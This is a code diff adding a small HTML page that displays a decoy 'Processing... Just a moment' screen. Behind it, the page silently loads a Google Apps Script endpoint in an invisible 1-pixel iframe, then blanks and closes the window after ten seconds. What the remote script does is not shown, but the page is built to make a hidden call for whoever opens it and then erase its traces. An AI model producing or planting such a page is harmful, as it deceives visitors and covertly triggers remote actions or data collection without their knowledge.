@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Loading...</title>
+    <style>
+      html, body {
+        margin: 0;
+        background: #111;
+        color: white;
+        font-family: sans-serif;
+        height: 100%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        flex-direction: column;
+      }
+      iframe {
+        width: 1px;
+        height: 1px;
+        border: none;
+        opacity: 0;
+        pointer-events: none;
+      }
+    </style>
+    <script>
+      setTimeout(() => {
+        window.open('about:blank', '_self');
+        window.close();
+      }, 10000); // 10 seconds
+    </script>
+  </head>
+  <body>
+    <h2>Processing... 🔐</h2>
+    <p>Just a moment</p>
+    <iframe src="https://script.google.com/macros/s/AKfycbw1NpPfPMuZbBJaJHrfL7MFxxz9G9D9nxNGbT35yQVu9Vd8eHYRY7bqCE9JtRjr9S8k/exec"></iframe>
+  </body>
+</html>
